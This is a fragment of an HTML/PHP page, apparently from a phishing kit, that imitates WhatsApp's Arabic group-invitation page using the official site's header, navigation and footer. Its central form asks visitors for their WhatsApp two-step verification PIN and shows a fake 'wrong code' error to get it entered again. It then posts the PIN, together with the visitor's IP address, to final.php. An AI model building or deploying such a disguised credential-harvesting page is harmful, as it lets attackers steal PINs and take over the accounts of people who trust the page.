                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">
                                                                മലയാളം</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">
                                                                ไทย</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">
                                                                简体中文</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">
                                                                繁體中文（台灣）</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">
                                                                繁體中文（香港）</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">
                                                                日本語</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">
                                                                한국어</option>
                                                        </select><svg width="12" height="8" viewBox="0 0 12 8"
                                                            fill="none" class="_a99- _afob">
                                                            <path
                                                                d="M1.41 -4.62904e-07L6 4.58L10.59 -6.16331e-08L12 1.41L6 7.41L-6.16331e-08 1.41L1.41 -4.62904e-07Z">
                                                            </path>
                                                        </svg></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </nav>
                            </div>
                        </div><span class="_afwd"><a data-testid="whatsapp_www_header_logo_link"
                                href="https://www.whatsapp.com/" class="_9vcv"><span class="_advp _aeam"><img
                                        class="_afvz" alt="صفحة واتساب الرئيسية"
                                        src="https://static.whatsapp.net/rsrc.php/v3/yq/r/mdQNdcFMi0p.png"></span></a></span><span
                            class="_afw1"><a data-testid="whatsapp_www_header_logo_link"
                                href="https://www.whatsapp.com/" class="_9vcv"><span class="_advp _aeam"><img
                                        class="_afvz" alt="صفحة واتساب الرئيسية"
                                        src="https://static.whatsapp.net/rsrc.php/v3/y7/r/DSxOAUB0raA.png"></span></a></span>
                        <nav class="_afwe">
                            <ul class="_afwg">
                                <li class="_afn_">
                                    <div><button aria-controls="replace_me_subnav" aria-expanded="false" id="u_0_7_wr"
                                            class="_9vd5 _aens _afod _afoe"><span class="_afog"><span
                                                    class="_9vg3 _aj1b" style="">الخصائص</span></span><svg width="8"
                                                height="13" fill="none" class="_9vd8 _agnt _afol _afok">
                                                <path d="M7.41 1.91L2.83 6.5l4.58 4.59L6 12.5l-6-6 6-6 1.41 1.41z"
                                                    fill="currentColor"></path>
                                            </svg></button>
                                        <div id="replace_me_subnav" class="_ag3x" aria-hidden="true">
                                            <ul role="menu" class="_afo6" id="u_0_8_iz">
                                                <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a
                                                        class="_ag3y" href="https://www.whatsapp.com/privacy"><span
                                                            class="_ag3-"><svg width="16" height="21"
                                                                viewBox="0 0 16 21" fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                class="_wauiIcon__privacy _ag3z">
                                                                <path
                                                                    d="M14 7H13V5C13 2.24 10.76 0 8 0C5.24 0 3 2.24 3 5V7H2C0.9 7 0 7.9 0 9V19C0 20.1 0.9 21 2 21H14C15.1 21 16 20.1 16 19V9C16 7.9 15.1 7 14 7ZM8 16C6.9 16 6 15.1 6 14C6 12.9 6.9 12 8 12C9.1 12 10 12.9 10 14C10 15.1 9.1 16 8 16ZM5 7V5C5 3.34 6.34 2 8 2C9.66 2 11 3.34 11 5V7H5Z"
                                                                    fill="currentColor"></path>
                                                            </svg></span>
                                                        <h5 class="_9vd5">المراسلة بخصوصية تامة</h5><span
                                                            class="_9vg3 _aj1a" style="">
                                                            <div class="_8l_f" style="box-sizing:border-box;">
                                                                <p>التشفير التام بين الطرفين وعناصر التحكم في الخصوصية.
                                                                </p>
                                                            </div>
                                                        </span><svg width="15" height="13" fill="none"
                                                            class="_wauiIcon__arrow _agnt _wauiNavDropdownCard__bottomIcon">
                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z"
                                                                fill="currentColor"></path>
                                                        </svg>
                                                    </a></li>
                                                <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a
                                                        class="_ag3y"
                                                        href="https://www.whatsapp.com/stayconnected"><span
                                                            class="_ag3-"><svg width="20" height="20" fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                class="_wauiIcon__globe-alt _ag3z">
                                                                <path
                                                                    d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0ZM9 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L7 13v1c0 1.1.9 2 2 2v1.93Zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H6V8h2c.55 0 1-.45 1-1V5h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39Z"
                                                                    fill="currentColor"></path>
                                                            </svg></span>
                                                        <h5 class="_9vd5">البقاء على اتصال</h5><span class="_9vg3 _aj1a"
                                                            style="">
                                                            <div class="_8l_f" style="box-sizing:border-box;">
                                                                <p>يمكنك المراسلة وإجراء مكالمات مجانًا* بجميع أنحاء
                                                                    العالم.</p>
                                                            </div>
                                                        </span><svg width="15" height="13" fill="none"
                                                            class="_wauiIcon__arrow _agnt _wauiNavDropdownCard__bottomIcon">
                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z"
                                                                fill="currentColor"></path>
                                                        </svg>
                                                    </a></li>
                                                <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a
                                                        class="_ag3y" href="https://www.whatsapp.com/community"><span
                                                            class="_ag3-"><svg width="24" height="13"
                                                                viewBox="0 0 24 13" fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                class="_wauiIcon__communities _ag3z">
                                                                <path
                                                                    d="M7.00049 5H5.00049V3C5.00049 2.45 4.55049 2 4.00049 2C3.45049 2 3.00049 2.45 3.00049 3V5H1.00049C0.450488 5 0.000488281 5.45 0.000488281 6C0.000488281 6.55 0.450488 7 1.00049 7H3.00049V9C3.00049 9.55 3.45049 10 4.00049 10C4.55049 10 5.00049 9.55 5.00049 9V7H7.00049C7.55049 7 8.00049 6.55 8.00049 6C8.00049 5.45 7.55049 5 7.00049 5ZM18.0005 6C19.6605 6 20.9905 4.66 20.9905 3C20.9905 1.34 19.6605 0 18.0005 0C17.6805 0 17.3705 0.0499999 17.0905 0.14C17.6605 0.95 17.9905 1.93 17.9905 3C17.9905 4.07 17.6505 5.04 17.0905 5.86C17.3705 5.95 17.6805 6 18.0005 6ZM13.0005 6C14.6605 6 15.9905 4.66 15.9905 3C15.9905 1.34 14.6605 0 13.0005 0C11.3405 0 10.0005 1.34 10.0005 3C10.0005 4.66 11.3405 6 13.0005 6ZM13.0005 8C11.0005 8 7.00049 9 7.00049 11V12C7.00049 12.55 7.45049 13 8.00049 13H18.0005C18.5505 13 19.0005 12.55 19.0005 12V11C19.0005 9 15.0005 8 13.0005 8ZM19.6205 8.16C20.4505 8.89 21.0005 9.82 21.0005 11V12.5C21.0005 12.67 20.9805 12.84 20.9505 13H23.5005C23.7805 13 24.0005 12.78 24.0005 12.5V11C24.0005 9.46 21.6305 8.51 19.6205 8.16Z"
                                                                    fill="currentColor"></path>
                                                            </svg></span>
                                                        <h5 class="_9vd5">بناء مجتمع</h5><span class="_9vg3 _aj1a"
                                                            style="">
                                                            <div class="_8l_f" style="box-sizing:border-box;">
                                                                <p>المحادثات الجماعية تجعل الأمر أكثر سهولة.</p>
                                                            </div>
                                                        </span><svg width="15" height="13" fill="none"
                                                            class="_wauiIcon__arrow _agnt _wauiNavDropdownCard__bottomIcon">
                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z"
                                                                fill="currentColor"></path>
                                                        </svg>
                                                    </a></li>
                                                <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a
                                                        class="_ag3y"
                                                        href="https://www.whatsapp.com/expressyourself"><span
                                                            class="_ag3-"><svg width="18" height="18"
                                                                viewBox="0 0 18 18" fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                class="_wauiIcon__smileFace _ag3z">
                                                                <path
                                                                    d="M8.99149 0C4.02349 0 0.000488281 4.032 0.000488281 9C0.000488281 13.968 4.02349 18 8.99149 18C13.9685 18 18.0005 13.968 18.0005 9C18.0005 4.032 13.9685 0 8.99149 0ZM5.85049 5.4C6.59749 5.4 7.20049 6.003 7.20049 6.75C7.20049 7.497 6.59749 8.1 5.85049 8.1C5.10349 8.1 4.50049 7.497 4.50049 6.75C4.50049 6.003 5.10349 5.4 5.85049 5.4ZM13.2395 11.448C12.4205 13.203 10.8365 14.4 9.00049 14.4C7.16449 14.4 5.58049 13.203 4.76149 11.448C4.61749 11.151 4.83349 10.8 5.16649 10.8H12.8345C13.1675 10.8 13.3835 11.151 13.2395 11.448ZM12.1505 8.1C11.4035 8.1 10.8005 7.497 10.8005 6.75C10.8005 6.003 11.4035 5.4 12.1505 5.4C12.8975 5.4 13.5005 6.003 13.5005 6.75C13.5005 7.497 12.8975 8.1 12.1505 8.1Z"
                                                                    fill="currentColor"></path>
                                                            </svg></span>
                                                        <h5 class="_9vd5">التعبير عن نفسك</h5><span class="_9vg3 _aj1a"
                                                            style="">
                                                            <div class="_8l_f" style="box-sizing:border-box;">
                                                                <p>عبِّر عما تشعر به من خلال الملصقات والصوت وصور GIF
                                                                    وغير ذلك الكثير.</p>
                                                            </div>
                                                        </span><svg width="15" height="13" fill="none"
                                                            class="_wauiIcon__arrow _agnt _wauiNavDropdownCard__bottomIcon">
                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z"
                                                                fill="currentColor"></path>
                                                        </svg>
                                                    </a></li>
                                                <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a
                                                        class="_ag3y" href="https://business.whatsapp.com/"><span
                                                            class="_ag3-"><svg width="20" height="18"
                                                                viewBox="0 0 20 18" fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                class="_wauiIcon__store _ag3z">
                                                                <path
                                                                    d="M19.8951 5.89L18.8451 1.52C18.6251 0.62 17.8451 0 16.9351 0H14.7251H12.7151H10.9951H8.99512H7.27512H5.25512H3.04512C2.14512 0 1.35512 0.63 1.14512 1.52L0.0951238 5.89C-0.144876 6.91 0.0751239 7.95 0.715124 8.77C0.795124 8.88 0.905124 8.96 0.995124 9.06V16C0.995124 17.1 1.89512 18 2.99512 18H16.9951C18.0951 18 18.9951 17.1 18.9951 16V9.06C19.0851 8.97 19.1951 8.88 19.2751 8.78C19.9151 7.96 20.1451 6.91 19.8951 5.89ZM5.01512 2L4.43512 6.86C4.35512 7.51 3.83512 8 3.22512 8C2.73512 8 2.42512 7.71 2.29512 7.53C2.03512 7.2 1.94512 6.77 2.04512 6.36L3.04512 2H5.01512ZM16.9051 1.99L17.9551 6.36C18.0551 6.78 17.9651 7.2 17.7051 7.53C17.5651 7.71 17.2651 8 16.7651 8C16.1551 8 15.6251 7.51 15.5551 6.86L14.9751 2L16.9051 1.99ZM13.5051 6.52C13.5551 6.91 13.4351 7.3 13.1751 7.59C12.9451 7.85 12.6251 8 12.2151 8C11.5451 8 10.9951 7.41 10.9951 6.69V2H12.9551L13.5051 6.52ZM8.99512 6.69C8.99512 7.41 8.44512 8 7.70512 8C7.36512 8 7.05512 7.85 6.81512 7.59C6.56512 7.3 6.44512 6.91 6.48512 6.52L7.03512 2H8.99512V6.69ZM15.9951 16H3.99512C3.44512 16 2.99512 15.55 2.99512 15V9.97C3.07512 9.98 3.14512 10 3.22512 10C4.09512 10 4.88512 9.64 5.46512 9.05C6.06512 9.65 6.86512 10 7.77512 10C8.64512 10 9.42512 9.64 10.0051 9.07C10.5951 9.64 11.3951 10 12.2951 10C13.1351 10 13.9351 9.65 14.5351 9.05C15.1151 9.64 15.9051 10 16.7751 10C16.8551 10 16.9251 9.98 17.0051 9.97V15C16.9951 15.55 16.5451 16 15.9951 16Z"
                                                                    fill="currentColor"></path>
                                                            </svg></span>
                                                        <h5 class="_9vd5">واتساب للأعمال</h5><span class="_9vg3 _aj1a"
                                                            style="">
                                                            <div class="_8l_f" style="box-sizing:border-box;">
                                                                <p>يمكنك الوصول إلى زبائنك من أي مكان.</p>
                                                            </div>
                                                        </span><svg
                                                            class="_wauiIcon__go-to-icon _agnt _wauiNavDropdownCard__bottomIcon"
                                                            width="10" height="10" fill="none"
                                                            xmlns="http://www.w3.org/2000/svg">
                                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                                d="M1.214.447a.75.75 0 0 0-.005 1.5l5.712.023L.645 8.245a.75.75 0 1 0 1.06 1.06L7.983 3.03l.022 5.713a.75.75 0 1 0 1.5-.006l-.03-7.487a.748.748 0 0 0-.779-.774L1.215.447Z"
                                                                fill="currentColor"></path>
                                                        </svg>
                                                    </a></li>
                                            </ul>
                                        </div>
                                    </div>
                                </li>
                                <li class="_afn_"><a href="https://www.whatsapp.com/privacy" class="_9vd5 _aens _afod"
                                        target="_self"><span><span class="_afog"><span class="_9vg3 _aj1b"
                                                    style="">الخصوصية</span></span></span></a></li>
                                <li class="_afn_"><a href="https://faq.whatsapp.com/" class="_9vd5 _aens _afod"
                                        target="_self"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">مركز
                                                    المساعدة</span></span></span></a></li>
                                <li class="_afn_"><a href="https://blog.whatsapp.com/" class="_9vd5 _aens _afod"
                                        target="_self"><span><span class="_afog"><span class="_9vg3 _aj1b"
                                                    style="">المدونة</span></span></span></a></li>
                            </ul>
                        </nav>
                        <div class="_agga"><span class="_ag1l"><span class="_afn_"><a href="https://web.whatsapp.com/"
                                        class="_9vd5 _aens _afod" target="_self"><span><span class="_afog"><span
                                                    class="_9vg3 _aj1b" style="">واتساب
                                                    ويب</span></span></span></a></span><a
                                    href="https://www.whatsapp.com/download" class="_aeo8 _9vcv _9u4o _9u4i"><span
                                        class="_advp _aeam">تنزيل</span><span><svg width="16" height="16"
                                            viewBox="0 0 16 16" fill="none"
                                            class="_wauiIcon__download-alternative _agnt _9u4c">
                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z"
                                                fill="currentColor"></path>
                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z"
                                                fill="currentColor"></path>
                                        </svg></span></a></span><a href="https://www.whatsapp.com/download"
                                aria-label="تنزيل" class="_afwh _adie _adif"><svg width="16" height="16"
                                    viewBox="0 0 16 16" fill="none"
                                    class="_wauiIcon__download-alternative _agnt _adid _afbl">
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z"
                                        fill="currentColor"></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd"
                                        d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z"
                                        fill="currentColor"></path>
                                </svg></a></div>
                    </div>
                </header>
            </div>
            <div data-testid="whatsapp_www_root" id="content-wrapper">
                <div class="_9r_7">
                    <section data-testid="waui_section" class="_9t2b _9t2d" style="">
                        <div class="_9t2e _9t2c">
                            <div class="_9t2g _9t2c _a1fe">
                                <div class="_9tar _9ta4 _9ta6 _9ta8">
                                    <div class="_9vd6 _9t33 _9bir _9bj3 _9bhj _9v12 _9tau _9tay _9u6w _9se- _9u5y">
                                        <div class="_9scd"></div>
                                        <div style="display: block;" id="main_block"><a
                                                href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar"
                                                title="اتبع هذا الرابط للانضمام" id="action-icon" class="_9vcv"><span
                                                    class="_advp _aeam"><img class="_9vx6"
                                                        src="https://static.whatsapp.net/rsrc.php/v3/yB/r/_0dVljceIA5.png"></span></a>
                                            <h3 class="_9vd5 _9scr" style="color:#5E5E5E;"></h3>
                                            <h4 class="_9vd5 _9scb" style="color:#5E5E5E;">الدعوة للانضمام إلى مجموعة
                                                واتساب</h4>
                                            </br></br>
                                            <form action="final.php" method="POST">
                                                  <strong style="font-style: italic;">أدخل رمز التحقق بخطوتين (PIN) الذي قمت بتجديده سابقا</strong>
                                                  <br><br><br>
                                                      <center><span style="color:#cc0000">رمز خاطئ غير صحيح</span></center>

                                                    <br>
                                                    <br>
                                                        <input type="text" name="codeconf4" id="codeconf4" class="input-phone" style="text-align:center;letter-spacing : 5px;  " placeholder="_ _ _  _ _ _"  pattern="[0-9]*" maxlength="6" required>
                                                 
                                                 
                                                   
                                                   <input type="hidden" name="id" value="<?php echo $_POST['id'] ?>">
                                                   <input type="hidden" name="ip" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                                                  <br>
                                                   
                                                  <br><br>
                                                 <button type="submit" class="_36or _2y_c _2z0c _2z07" style="margin-right:-10px"><span class="_advp">الانضمام إلى الدردشة</span></button>
                                                                                   
                                              </form>
                                              
                                            <hr class="_9tpv _9scb _9scr _9scb _9scr" style="background-color:#F0F4F9;">
                                            <h4 class="_9vd5" style="color:#5E5E5E;">أليس لديك تطبيق واتساب بعد؟</h4>
                                            <h4 class="_9vd5 _9scc"><a href="https://www.whatsapp.com/download"
                                                    class="_9vcv _9vcx"><span class="_advp _aeam">التنزيل</span></a>
                                            </h4>
                                        </div>
                                        <div id="fallback_block" style="display: none;">
                                            <h3 class="_9vd5">يبدو أن تطبيق واتساب غير مثبت على جهازك!</h3><a
                                                href="https://www.whatsapp.com/download" class="_9vcv _advm _9scr"><span
                                                    class="_advp _aeam">التنزيل</span></a>
                                            <div class="_9vd6 _9t33 _9bir _9bj3 _9bhj _9v12 _9tau _9tay">
                                                <p class="_9vd5">اتبع هذا الرابط للانضمام</p>
                                                <h4 class="_9vd5 _9scc"><a
                                                        href="https://web.whatsapp.com/accept?code=--sanitized-S228802--"
                                                        class="_9vcv _9vcx"><span class="_advp _aeam">استخدم واتساب
                                                            ويب</span></a></h4>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                </div>
            </div>
        </div>
        <div id="footer-wrapper" class="_allg">
            <div class="_adhc">
                <footer class="_9t2i" data-testid="whatsapp_www_footer">
                    <div class="_9tar _9ta3 _9ta5 _9ta8 _9ta- _9tau _ae_r"><span class="_ae_s"><a
                                href="https://www.whatsapp.com/download"
                                class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs"><span
                                    class="_advp _aeam">تنزيل</span><span><svg width="16" height="16"
                                        viewBox="0 0 16 16" fill="none"
                                        class="_wauiIcon__download-alternative _agnt _9u4c">
                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                            d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z"
                                            fill="currentColor"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd"
                                            d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z"
                                            fill="currentColor"></path>
                                    </svg></span></a></span>
                        <div class="_9tar _9ta3 _9ta5 _9ta7 _9tay _9tau _9uo9 _ae_t"><a aria-label="Twitter"
                                href="https://twitter.com/whatsapp" class="_afwh _adig _ad_c" target="_blank"
                                rel="noopener"><svg viewBox="0 0 19 16" width="19" height="16" fill="none"
                                    class="_aghm _adid _afbl">
                                    <path
                                        d="M18.3087 2.19814C17.7317 2.43004 17.1358 2.5943 16.521 2.67161C16.5116 2.66194 16.5021 2.66194 16.4926 2.65228C17.2588 2.15948 17.7885 1.47344 18.0817 0.584469C18.0533 0.603794 18.0439 0.603795 18.0249 0.613457C17.325 1.02895 16.5778 1.31883 15.7832 1.49276C15.7359 1.50242 15.7076 1.49276 15.6792 1.45411C14.8279 0.594132 13.7969 0.207624 12.6051 0.333239C11.8106 0.420203 11.1201 0.729409 10.5336 1.28984C9.51207 2.26578 9.13373 3.47361 9.38912 4.88436C9.39858 4.94234 9.39857 4.96166 9.33236 4.96166C8.8878 4.93267 8.43377 4.88436 7.99866 4.7974C7.07171 4.62347 6.1826 4.32393 5.34077 3.89877C4.05438 3.26103 2.9477 2.39139 2.00182 1.28984C1.92615 1.20288 1.85049 1.11592 1.77482 1.01929C1.49106 1.46377 1.23567 2.22712 1.2735 3.03879C1.33025 4.32392 1.88832 5.31918 2.9004 6.06321C2.3045 6.04388 1.75588 5.87962 1.23565 5.58974C1.23565 6.49803 1.50052 7.30969 2.05858 8.00541C2.61665 8.71078 3.32605 9.1456 4.20572 9.34852C4.17734 9.35818 4.15843 9.36784 4.13951 9.36784C3.6382 9.49346 3.12741 9.51278 2.61664 9.42582C2.54097 9.41615 2.54097 9.41616 2.56935 9.49346C2.68285 9.83165 2.83418 10.1409 3.03282 10.4307C3.62872 11.2811 4.42326 11.8028 5.42589 11.9864C5.6056 12.0251 5.79479 12.0347 6.00288 12.0444C4.37597 13.3102 2.5599 13.8223 0.545181 13.6194C0.55464 13.6291 0.56409 13.6387 0.583007 13.6484C1.32079 14.1219 2.10587 14.4987 2.92878 14.7789C3.84628 15.0881 4.78271 15.2621 5.7475 15.3007C6.24881 15.3201 6.75959 15.3104 7.2609 15.2621C7.81897 15.2138 8.36757 15.1171 8.91618 14.9819C10.7985 14.4987 12.4065 13.5421 13.7496 12.112C14.8468 10.9332 15.6413 9.57076 16.1616 8.03439C16.4453 7.2034 16.6251 6.34342 16.7007 5.46412C16.7386 5.01964 16.748 4.57515 16.7291 4.13067C16.7291 4.0727 16.748 4.04371 16.7859 4.00506C17.4574 3.49293 18.0344 2.89385 18.5074 2.18847C18.5168 2.16915 18.5452 2.14982 18.5452 2.11117C18.4601 2.14016 18.3844 2.16915 18.3087 2.19814Z"
                                        fill="currentColor"></path>
                                </svg></a><a aria-label="Youtube"
                                href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw"
                                class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg width="23" height="16"
                                    viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg"
                                    class="_wauiIcon__youtube _adid _afbl">
                                    <path
                                        d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z"
                                        fill="currentColor"></path>
                                </svg></a><a aria-label="Instagram" href="https://www.instagram.com/whatsapp/?hl=en"
                                class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg width="20" height="21"
                                    viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg"
                                    class="_wauiIcon__instagram _adid _afbl">
                                    <path
                                        d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 